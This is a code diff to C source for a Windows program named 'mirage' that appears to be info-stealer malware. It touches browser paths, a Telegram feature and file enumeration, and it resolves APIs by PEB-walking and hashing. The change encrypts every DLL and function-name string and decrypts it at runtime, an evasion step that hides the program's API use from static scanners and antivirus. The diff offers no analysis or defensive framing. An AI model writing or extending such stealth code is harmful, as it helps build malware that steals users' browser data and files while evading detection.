@@ -17,6 +17,7 @@
 #include "export_resolve.h"
 #include "hash.h"
 #include "browser_paths.h"
+#include "enc_strings.h"
 
 #ifdef ENABLE_TELEGRAM
 #ifdef _WIN32
@@ -30,10 +31,12 @@
 /* Unix timestamp via PEB-walk (no CRT time() dependency) */
 static long mirage_unix_timestamp(void) {
     typedef void (WINAPI *fnGSFT)(LPFILETIME);
-    void *k32 = mirage_get_module_by_hash(mirage_encrypted_hash_module("kernel32.dll"));
+    char dll[32]; enc_decrypt(enc_kernel32, ENC_KERNEL32_LEN, dll);
+    void *k32 = mirage_get_module_by_hash(mirage_encrypted_hash_module(dll));
     if (!k32) return 0;
+    char fn_ts[32]; enc_decrypt(enc_GetSystemTimeAsFileTime, ENC_GETSYSTEMTIMEASFILETIME_LEN, fn_ts);
     fnGSFT pfn = (fnGSFT)mirage_get_function_by_hash(
-        k32, mirage_encrypted_hash_func("GetSystemTimeAsFileTime"));
+        k32, mirage_encrypted_hash_func(fn_ts));
     if (!pfn) return 0;
     FILETIME ft; pfn(&ft);
     unsigned long long raw = ((unsigned long long)ft.dwHighDateTime << 32) | ft.dwLowDateTime;
@@ -95,18 +98,25 @@ static void *tw_resolve(void *mod, const char *name) {
     return mirage_get_function_by_hash(mod, mirage_encrypted_hash_func(name));
 }
 
+static void *tw_resolve_enc(void *mod, const uint8_t *enc, size_t enc_len) {
+    char name[32];
+    enc_decrypt(enc, enc_len, name);
+    return mirage_get_function_by_hash(mod, mirage_encrypted_hash_func(name));
+}
+
 static int tw_ensure_api(void) {
     if (tw_api.ready) return 1;
 
-    void *k32 = mirage_get_module_by_hash(mirage_encrypted_hash_module("kernel32.dll"));
+    char dll[32]; enc_decrypt(enc_kernel32, ENC_KERNEL32_LEN, dll);
+    void *k32 = mirage_get_module_by_hash(mirage_encrypted_hash_module(dll));
     if (!k32) return 0;
 
-    tw_api.pGetEnvA = (fnGetEnvA)           tw_resolve(k32, "GetEnvironmentVariableA");
-    tw_api.pFF      = (fnFindFirstFileA)    tw_resolve(k32, "FindFirstFileA");
-    tw_api.pFN      = (fnFindNextFileA)     tw_resolve(k32, "FindNextFileA");
-    tw_api.pFC      = (fnFindClose)         tw_resolve(k32, "FindClose");
-    tw_api.pGFA     = (fnGetFileAttributesA)tw_resolve(k32, "GetFileAttributesA");
-    tw_api.pMKDir   = (fnCreateDirectoryA)  tw_resolve(k32, "CreateDirectoryA");
+    tw_api.pGetEnvA = (fnGetEnvA)           tw_resolve_enc(k32, enc_GetEnvironmentVariableA, ENC_GETENVIRONMENTVARIABLEA_LEN);
+    tw_api.pFF      = (fnFindFirstFileA)    tw_resolve_enc(k32, enc_FindFirstFileA, ENC_FINDFIRSTFILEA_LEN);
+    tw_api.pFN      = (fnFindNextFileA)     tw_resolve_enc(k32, enc_FindNextFileA, ENC_FINDNEXTFILEA_LEN);
+    tw_api.pFC      = (fnFindClose)         tw_resolve_enc(k32, enc_FindClose, ENC_FINDCLOSE_LEN);
+    tw_api.pGFA     = (fnGetFileAttributesA)tw_resolve_enc(k32, enc_GetFileAttributesA, ENC_GETFILEATTRIBUTESA_LEN);
+    tw_api.pMKDir   = (fnCreateDirectoryA)  tw_resolve_enc(k32, enc_CreateDirectoryA, ENC_CREATEDIRECTORYA_LEN);
 
     if (!tw_api.pGetEnvA || !tw_api.pFF || !tw_api.pFN ||
         !tw_api.pFC || !tw_api.pGFA || !tw_api.pMKDir)
